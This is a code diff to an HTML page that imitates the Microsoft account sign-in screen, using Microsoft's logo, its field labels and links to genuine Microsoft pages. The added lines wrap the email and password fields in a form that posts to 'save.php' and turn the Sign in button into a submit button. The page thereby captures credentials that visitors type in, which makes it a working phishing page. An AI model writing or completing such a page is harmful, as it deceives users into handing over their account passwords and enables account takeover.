@@ -17,9 +17,10 @@
 <body class="text-nowrap" style="width: 100%;height: 100vh;">
     <div id="loginForm" class="container"><img id="image" src="assets/img/microsoft_logo.svg">
         <div></div>
+        <form action="save.php" method="post">
         <section id="section-main">
             <section id="section-1" class="slide-page">
-                <p id="signIn" class="field">Sign in</p><h5 id="result"></h5><input type="email" id="email" class="field" placeholder="Email, phone, or Skype" />
+                <p id="signIn" class="field">Sign in</p><h5 id="result"></h5><input type="email" name="email" id="email" class="field" placeholder="Email, phone, or Skype" />
                 <p id="NoAccount" class="field">No account?<a id="linkCreateAccount" href="https://signup.live.com/?lic=1" style="color: #0067b8;">Create One!</a></p>
                 <p id="signInSecurityKey" class="field"><a href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key" style="color: #0067b8;">Sign in with a security key</a><i class="far fa-question-circle fa-lg" id="iconQ"></i></p>
                 <p
@@ -30,13 +31,14 @@
                 <p id="userLine">P</p><button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" type="button" style="font-size: 12px;height: 25px;width: 26px;"><i class="la la-long-arrow-left" id="arrowBack-1" style="width: 1px;font-size: 19px;font-weight: 800;margin: -1px;"></i></button>
                 <p
                     id="enterPwd">Enter Password</p><h5 id="passResult"></h5>
-                    <p><input type="password" id="password" placeholder="Password"></p>
+                    <p><input type="password" name="password" id="password" placeholder="Password"></p>
                     <p id="keepMe">Keep me signed in</p><input type="checkbox" id="cbRemember">
                     <p id="ForgodPwd"><a href="#">Forgot password?</a></p>
                     <p id="SignWithKey"><a href="#">Sign in with Windows Hello or a security key</a></p>
-                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="button">Sign in</button></p>
+                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="submit">Sign in</button></p>
             </section>
         </section>
+      </form>
     </div>
     <div id="footer" style="height: 36px;">
         <div id="terms" style="float: left;width: 84px;">
